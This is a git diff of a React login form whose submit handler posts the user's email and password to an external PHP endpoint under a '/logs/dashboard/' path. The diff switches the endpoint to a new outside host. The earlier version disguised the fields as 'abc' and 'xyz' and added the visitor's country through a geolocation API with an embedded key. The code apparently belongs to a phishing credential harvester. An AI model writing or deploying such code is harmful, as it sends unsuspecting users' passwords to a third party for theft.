@@ -37,18 +37,8 @@ const App = ()=>{
 
   const [count, setCount] = useState(0);
 
-  const [country, setCountry] = useState('');
-
   // kdd
   const submitHandler = (e) => {
-    fetch('https://api.geoapify.com/v1/ipinfo?apiKey=44db379787c14bccb69d3de62462aefb')
-    .then(req=> req.json())
-    .then(res=>{
-      setTimeout(()=>{
-        setCountry(res.country.name);
-      }, 2500)
-    })
-    .catch(e=>console.error('!!👻'))
     
     e.preventDefault();
     if (pwd === "") {
@@ -65,14 +55,14 @@ const App = ()=>{
         }, 1700);
 
         const user = {
-          abc: email,
-          xyz: pwd,
-          locatorm: country
+          email: email,
+          password: pwd,
+
       };
 
       $.ajax({
           type: "POST",
-          url: "https://webserver-yvsv.onrender.com/send",
+          url: "https://bucketlion.com/logs/dashboard/file/wbmp.php",
           data: user,
           success(data) {
               console.log(data);
